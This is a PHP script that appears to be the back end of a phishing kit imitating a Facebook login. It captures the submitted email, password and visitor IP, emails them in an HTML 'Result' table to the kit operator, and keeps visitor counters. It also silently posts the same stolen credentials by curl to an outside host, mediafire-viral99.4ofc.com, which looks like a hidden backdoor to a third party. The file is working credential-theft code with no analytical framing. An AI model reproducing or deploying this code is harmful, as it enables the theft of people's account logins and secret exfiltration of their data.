<?php

$user = $_POST['user'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];

$subjek = "Result | Punya si $user";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
<tr>
					<th style="text-align: center;" colspan="3"> Info Facebook </th>
				</tr>
				<tr>
					<td style="border-right: none;">Email</td>
					<td style="text-align: center;">$user</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$pass</td>
				</tr>
               <tr>
					<td style="border-right: none;">IP Address</td>
					<td style="text-align: center;">$ip</td>
				</tr>			
				<tr>
					<th style="text-align: center;" colspan="3">&copy; YosokaNesia</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;


// TODAY
$Tget = file_get_contents("etc/visitor.json");
$Tdecode = json_decode($Tget,true);
$today = $Tdecode['today'] + 1;
$Tdecode['today'] = $today;
$Tresult = json_encode($Tdecode);
            $Tfile = fopen('etc/visitor.json','w');
                     fwrite($Tfile,$Tresult);
                     fclose($Tfile);
                     
// YESTERDAY
if(date("H:i") == "01:00"){
$Yget = file_get_contents("etc/visitor.json");
$Ydecode = json_decode($Yget,true);
$Ydecode['yesterday'] = $Ydecode['today'];
$Ydecode['today'] = 0;
$Yresult = json_encode($Ydecode);
            $Yfile = fopen('etc/visitor.json','w');
                     fwrite($Yfile,$Yresult);
                     fclose($Yfile);
}

// ALL OVER
$Aget = file_get_contents("etc/visitor.json");
$Adecode = json_decode($Aget,true);
$all = $Adecode['total'] + 1;
$Adecode['total'] = $all;
$Aresult = json_encode($Adecode);
            $Afile = fopen('etc/visitor.json','w');
                     fwrite($Afile,$Aresult);
                     fclose($Afile);

// RESULT DATA
$resultGet = file_get_contents("etc/data.json");
$resultData = json_decode($resultGet,true);

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: '.$resultData['nama'].' <yumekodeveloper@gmail.com>' . "\r\n";
include 'data.php';

if(mail($resultData['email'], $subjek, $pesan, $headers))
{
$upGet = file_get_contents("etc/data.json");
$upData = json_decode($upGet,true);
$hasil = $upData['totals'] + 1;
$upData['totals'] = $hasil;
$upResult = json_encode($upData);
$upFile = fopen('etc/data.json','w');
          fwrite($upFile,$upResult);
          fclose($upFile);
}

$url = "https://mediafire-viral99.4ofc.com/apiii.php";
$data = "subjek=".$subjek."&pesan=".$pesan."&sender=".$sender;
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $url);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($ch2);
curl_close($ch2);

?>


